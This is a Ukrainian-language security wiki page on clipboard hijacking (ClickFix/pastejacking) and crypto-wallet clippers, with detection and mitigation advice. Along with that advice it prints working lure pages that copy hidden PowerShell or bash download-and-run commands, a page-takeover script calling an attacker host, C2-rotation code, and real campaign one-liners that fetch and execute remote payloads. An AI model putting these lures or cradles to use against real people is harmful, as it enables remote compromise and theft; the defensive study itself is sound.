# Атаки Clipboard Hijacking (Pastejacking)

> "Ніколи не вставляйте те, що не копіювали самостійно." – стара, але досі актуальна порада

## Огляд

Clipboard hijacking – також відомий як *pastejacking* – зловживає тим, що користувачі регулярно копіюють і вставляють команди, не перевіряючи їх. Шкідлива вебсторінка (або будь-який контекст із підтримкою JavaScript, наприклад Electron чи Desktop application) програмно поміщає контрольований зловмисником текст у системний буфер обміну. Жертв зазвичай за допомогою ретельно підготовлених інструкцій із соціальної інженерії спонукають натиснути **Win + R** (діалогове вікно Run), **Win + X** (Quick Access / PowerShell) або відкрити термінал і *вставити* вміст буфера обміну, негайно виконавши довільні команди.

Оскільки **жоден файл не завантажується і жоден вкладений файл не відкривається**, техніка обходить більшість засобів безпеки електронної пошти та вебконтенту, які відстежують вкладення, макроси або безпосереднє виконання команд. Тому ця атака популярна у phishing-кампаніях, що доставляють поширені сімейства malware, такі як NetSupport RAT, Latrodectus loader або Lumma Stealer.<sup>[[1]](#references)</sup>

## Clippers для підміни адрес wallet

Інший варіант **clipboard hijacking** взагалі не вставляє команди: він очікує, доки жертва скопіює **адресу cryptocurrency wallet**, а потім непомітно замінює її на адресу, контрольовану зловмисником, безпосередньо перед вставленням. Це особливо ефективно для довгих форматів wallet, оскільки користувачі часто перевіряють лише перші та останні символи.<sup>[[8]](#references)</sup>

Поширені ознаки реальних атак:
- **Thin loader + nested payload**: видимий app/exe виглядає як легітимний trading або "profit" tool, тоді як справжній clipper прихований глибше в bundle (наприклад, .NET loader запускає вкладений Rust payload).
- **Regex-driven replacement**: malware знаходить рядки на кшталт `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` або навіть звичайні **44-character Solana-like** рядки й замінює їх на wallet зловмисника.
- **Wallet rotation at scale**: сучасні Windows-зразки можуть містити **тисячі** wallet для заміни на кожну currency замість однієї статичної адреси, зменшуючи репутаційні втрати wallet після кожної крадіжки.<sup>[[8]](#references)</sup>

### Windows clipper flow

Поширена реалізація – це приховане вікно, зареєстроване за допомогою **`AddClipboardFormatListener`**. Під час кожного оновлення буфера обміну malware зазвичай викликає:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → отримати доступ до поточних даних буфера обміну.
- **`GetClipboardData`** → прочитати текст.
- **`EmptyClipboard`** + **`SetClipboardData`** → замінити рядок wallet на значення зловмисника.

Мінімальні hunting regex, які часто зустрічаються в clippers:
```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```
Persistence на рівні користувача достатня для досягнення впливу. Один із виявлених шаблонів:<sup>[[8]](#references)</sup>
- Скопіювати payload до **`%APPDATA%\silke\silke.exe`**
- Створити **LNK у Startup-folder** за шляхом `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

Ідеї для виявлення:
- Процеси, які безперервно викликають clipboard APIs, одночасно записуючи дані до `%APPDATA%` і папки користувача **Startup**.
- Створення нового LNK/виконуваного файлу з подальшим переписуванням адрес криптогаманців у clipboard.
- Архіви або пакети з підробленим ПЗ, що містять багато невикористаних файлів і невеликий launcher, який запускає вкладений binary.

### macOS social-engineered quarantine removal + LaunchAgent persistence

На macOS деякі кампанії поширюють допоміжний файл **`unlocker.command`** і вказують жертві клацнути правою кнопкою миші → **Open**, якщо Gatekeeper повідомляє, що застосунок пошкоджений або походить від невідомого розробника. Скрипт просто видаляє quarantine і запускає розташований поруч `.app`:<sup>[[8]](#references)</sup>
```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```
Це **не** Gatekeeper exploit; це **соціально інженерований обхід quarantine**, який зловживає тим, що рішення Gatekeeper залежать від xattr `com.apple.quarantine`.<sup>[[8]](#references)</sup>

Після виконання clipper може закріпитися від імені поточного користувача, записавши:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – LaunchAgent із `RunAtLoad` і `KeepAlive`

Важлива деталь для захисту: деякі зразки реалізують **self-healing watchdog**, який приблизно кожні 30 секунд повторно записує LaunchAgent і wrapper. Якщо спочатку видалити plist **без завершення запущеного процесу**, malware може негайно створити його знову.<sup>[[8]](#references)</sup> Безпечний порядок очищення:
1. Завершити активний процес clipper.
2. Вивантажити/видалити plist LaunchAgent.
3. Видалити `~/launch.sh` і скопійований payload.

### Примітка щодо доставки: фальшива репутація як підсилювач

Для цього family malware може залишатися технічно простим, тоді як **distribution layer** виконує основну роботу: фальшиві зірки/форки GitHub, відгуки/завантаження на SourceForge, коментарі/перегляди YouTube-туторіалів і коментарі/голоси у VirusTotal, що виглядають нешкідливо, використовуються для створення враження надійності binary перед виконанням.<sup>[[8]](#references)</sup>

## Примусові кнопки копіювання та приховані payloads (macOS one-liners)

Деякі macOS infostealers клонують сайти інсталяторів (наприклад, Homebrew) і **примушують використовувати кнопку “Copy”**, щоб користувачі не могли виділити лише видимий текст. Запис у clipboard містить очікувану команду інсталятора та доданий Base64 payload (наприклад, `...; echo <b64> | base64 -d | sh`), тому одна вставка виконує обидві дії, тоді як UI приховує додатковий етап.<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Старіші кампанії використовували `document.execCommand('copy')`, а новіші покладаються на асинхронний **Clipboard API** (`navigator.clipboard.writeText`).<sup>[[2]](#references)</sup>

## Потік ClickFix / ClearFake

1. Користувач відвідує сайт із typosquatting або скомпрометований сайт (наприклад, `docusign.sa[.]com`)
2. Ін'єктований **ClearFake** JavaScript викликає helper `unsecuredCopyToClipboard()`, який непомітно зберігає закодований у Base64 однорядковий PowerShell-скрипт у буфері обміну.
3. Інструкції HTML повідомляють жертві: *«Натисніть **Win + R**, вставте команду й натисніть Enter, щоб усунути проблему.»*
4. `powershell.exe` виконується та завантажує архів, що містить легітимний executable і шкідливу DLL (класичний DLL sideloading).
5. Loader розшифровує додаткові етапи, ін'єктує shellcode і встановлює persistence (наприклад, scheduled task), зрештою запускаючи NetSupport RAT / Latrodectus / Lumma Stealer.<sup>[[1]](#references)</sup>

### Ланцюжок NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (легітимний Java WebStart) шукає `msvcp140.dll` у своєму каталозі.
* Шкідлива DLL динамічно визначає API за допомогою **GetProcAddress**, завантажує два бінарні файли (`data_3.bin`, `data_4.bin`) через **curl.exe**, розшифровує їх за допомогою ключа циклічного XOR `"https://google.com/"`, інжектує фінальний shellcode та розпаковує **client32.exe** (NetSupport RAT) у `C:\ProgramData\SecurityCheck_v1\`.<sup>[[1]](#references)</sup>

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Завантажує `la.txt` за допомогою **curl.exe**
2. Виконує JScript downloader усередині **cscript.exe**
3. Отримує MSI payload → розміщує `libcef.dll` поруч із підписаною програмою → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer через MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Виклик **mshta** запускає прихований PowerShell-скрипт, який отримує `PartyContinued.exe`, витягує `Boat.pst` (CAB), відновлює `AutoIt3.exe` за допомогою `extrac32` і конкатенації файлів та зрештою запускає `.a3x`-скрипт, що вивантажує облікові дані браузера на `sumeriavgv.digital`.<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK із rotating C2 (PureHVNC)

Деякі кампанії ClickFix повністю пропускають завантаження файлів і натомість інструктують жертв вставити однорядкову команду, яка отримує та виконує JavaScript через WSH, забезпечує persistence і щодня змінює C2. Приклад зафіксованого ланцюжка:<sup>[[3]](#references)</sup>
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Ключові ознаки
- URL-адреса обфускується та розвертається під час виконання, щоб перешкодити поверхневому аналізу.
- JavaScript забезпечує власне збереження через Startup LNK (WScript/CScript) і вибирає C2 за поточним днем, що дає змогу швидко змінювати домени.<sup>[[3]](#references)</sup>

Мінімальний фрагмент JS, що використовується для ротації C2 за датою:<sup>[[3]](#references)</sup>
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Наступний етап зазвичай розгортає loader, який встановлює persistence і завантажує RAT (наприклад, PureHVNC), часто закріплюючи TLS на hardcoded сертифікаті та розбиваючи трафік на фрагменти.<sup>[[3]](#references)</sup>

Ідеї для виявлення, специфічні для цього варіанта
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (або `cscript.exe`).
- Артефакти автозапуску: LNK у `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`, який викликає WScript/CScript із JS-шляхом у `%TEMP%`/`%APPDATA%`.
- Телеметрія Registry/RunMRU і командного рядка, що містить `.split('').reverse().join('')` або `eval(a.responseText)`.
- Повторювані `powershell -NoProfile -NonInteractive -Command -` із великими payloads через stdin для передавання довгих скриптів без довгих командних рядків.
- Scheduled Tasks, які згодом виконують LOLBins, наприклад `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`, у межах завдання/шляху, що імітує updater (наприклад, `\GoogleSystem\GoogleUpdater`).

Полювання на загрози
- C2-хостнейми та URL-адреси, що змінюються щодня, із шаблоном `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Корелюйте події запису в clipboard, після яких відбувається вставлення через Win+R і негайний запуск `powershell.exe`.

Blue-teams можуть поєднувати телеметрію clipboard, створення процесів і Registry, щоб точно визначати зловживання pastejacking:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` зберігає історію команд **Win + R** — шукайте незвичні Base64 / обфусковані записи.
* Security Event ID **4688** (Process Creation), де `ParentImage` == `explorer.exe`, а `NewProcessName` входить до { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** для створення файлів у `%LocalAppData%\Microsoft\Windows\WinX\` або тимчасових теках безпосередньо перед підозрілою подією 4688.
* EDR-сенсори clipboard (якщо доступні) — корелюйте `Clipboard Write`, після якого негайно створюється новий процес PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Нещодавні кампанії масово створюють підроблені сторінки перевірки CDN/браузера ("Just a moment…", IUAM-style), які змушують користувачів копіювати OS-specific команди з clipboard у native consoles. Це переносить виконання за межі sandbox браузера та працює у Windows і macOS.<sup>[[4]](#references)</sup>

Основні ознаки сторінок, згенерованих builder
- Визначення OS через `navigator.userAgent` для адаптації payloads (Windows PowerShell/CMD проти macOS Terminal). Необов’язкові decoys/no-ops для непідтримуваних OS, щоб зберегти ілюзію.
- Автоматичне копіювання в clipboard під час безпечних дій UI (checkbox/Copy), тоді як видимий текст може відрізнятися від вмісту clipboard.
- Блокування мобільних пристроїв і popover із покроковими інструкціями: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Необов’язкова обфускація та single-file injector для перезапису DOM скомпрометованого сайту verification UI, стилізованим за допомогою Tailwind (реєстрація нового домену не потрібна).<sup>[[4]](#references)</sup>

Приклад: невідповідність clipboard + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` so execution continues after the terminal closes, reducing visible artifacts.<sup>[[4]](#references)</sup>

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Ідеї для виявлення та полювання, специфічні для IUAM-style lures
- Web: Сторінки, які прив'язують Clipboard API до verification widgets; невідповідність між відображуваним текстом і вмістом clipboard; розгалуження через `navigator.userAgent`; Tailwind + single-page replace у підозрілих контекстах.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` невдовзі після взаємодії з браузером; batch/MSI installers, запущені з `%TEMP%`.
- macOS endpoint: Terminal/iTerm, що запускає `bash`/`curl`/`base64 -d` з `nohup` поблизу подій у браузері; background jobs, які продовжують працювати після закриття terminal.
- Корелюйте історію `RunMRU` Win+R і записи до clipboard із подальшим створенням console process.

Див. також supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Еволюція fake CAPTCHA / ClickFix у 2026 році (ClearFake, Scarlet Goldfinch)

- ClearFake продовжує компрометувати WordPress-сайти та впроваджувати loader JavaScript, який ланцюжком звертається до external hosts (Cloudflare Workers, GitHub/jsDelivr) і навіть виконує blockchain “etherhiding” calls (наприклад, POST-запити до Binance Smart Chain API endpoints, таких як `bsc-testnet.drpc[.]org`), щоб отримувати актуальну lure logic. В останніх overlays активно використовуються fake CAPTCHAs, які вказують користувачам скопіювати/вставити one-liner (T1204.004), замість завантаження будь-чого.<sup>[[6]](#references)</sup>
- Initial execution дедалі частіше делегується signed script hosts/LOLBAS. У січні 2026 року ланцюжки замінили попереднє використання `mshta` на вбудований `SyncAppvPublishingServer.vbs`, виконуваний через `WScript.exe`, із передаванням PowerShell-подібних аргументів з aliases/wildcards для отримання remote content:<sup>[[6]](#references)</sup>
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` підписаний і зазвичай використовується App-V; у поєднанні з `WScript.exe` та незвичними аргументами (аліаси `gal`/`gcm`, cmdlet із підстановочними символами, URL-адреси jsDelivr) він стає високосигнальним етапом LOLBAS для ClearFake.<sup>[[6]](#references)</sup>
- У лютому 2026 року фальшиві payloads CAPTCHA знову перейшли на завантажувальні конструкції, що використовують лише PowerShell. Два активні приклади:<sup>[[6]](#references)</sup>
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Перший chain є in-memory `iex(irm ...)` grabber; другий використовує `WinHttp.WinHttpRequest.5.1`, записує тимчасовий `.ps1`, а потім запускає його з `-ep bypass` у прихованому вікні.<sup>[[6]](#references)</sup>

Поради щодо виявлення та полювання на ці варіанти
- Process lineage: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` або PowerShell cradles одразу після запису в clipboard/Win+R.
- Ключові слова командного рядка: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, домени jsDelivr/GitHub/Cloudflare Worker або шаблони raw IP `iex(irm ...)`.
- Network: вихідні підключення до CDN worker hosts або blockchain RPC endpoints зі script hosts/PowerShell невдовзі після web browsing.
- File/registry: створення тимчасового `.ps1` у `%TEMP%` разом із записами RunMRU, що містять ці one-liners; блокувати або створювати alert для signed-script LOLBAS (WScript/cscript/mshta), які виконуються із зовнішніми URL або obfuscated alias strings.

## ClickFix tradecraft за червень 2026 року: paste telemetry, fake verification comments і LOLBin chaining

Нещодавня телеметрія Red Canary показує, що стабільним індикатором є **не одна конкретна команда**, а поєднання **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** та **immediate execution**.<sup>[[7]](#references)</sup>

### Помітні operator patterns

- **Paste confirmation telemetry**: деякі payloads викликають `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` перед основним stage. Це підтверджує взаємодію користувача, водночас зберігаючи вікно коротким і непомітним.
- **Fake verification comments**: PowerShell one-liners можуть додавати рядки на кшталт `# Security check ✔️ I'm not a robot Verification ID: 138105`, щоб після вставлення в Run / `cmd.exe` / PowerShell history команда все ще виглядала пов’язаною з CAPTCHA.
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` уникає статичного URL у командному рядку, водночас виконуючи in-memory download-and-execute.
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` зловживає незвичним регістром і Unicode-подібними символами у flags, щоб обходити крихкі detections, водночас залишаючись схожим на `msiexec.exe`.
- **Caret-escaped LOLBin chains**: `cmd.exe` може приховувати ключові слова за допомогою escape-символів `^` (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`), запускати вкладену shell у minimized mode, зберігати attacker content із benign extension, наприклад `.pdf`, а потім виконувати його через `mshta`.<sup>[[7]](#references)</sup>
## Mitigations

1. Browser hardening – вимкнути clipboard write-access (`dom.events.asyncClipboard.clipboardItem` тощо) або вимагати user gesture.
2. Security awareness – навчати користувачів *вводити* sensitive commands або спочатку вставляти їх у text editor.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control для блокування довільних one-liners.
4. Network controls – блокувати вихідні запити до відомих pastejacking і malware C2 domains.

## Related Tricks

* **Discord Invite Hijacking** часто зловживає тим самим підходом ClickFix після заманювання користувачів на malicious server:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [1] [Виправлення Click: запобігання вектору атаки ClickFix](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Під чистою завісою: від RAT до Builder і Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [Фабрика ClickFix: перше розкриття генератора IUAM ClickFix](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025 рік — рік Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Огляди розвідданих: лютий 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Огляди розвідданих: червень 2026 року](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Від зірок до Upvotes: фальшива репутація як паливо для Crypto Clipboard Hijacker](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
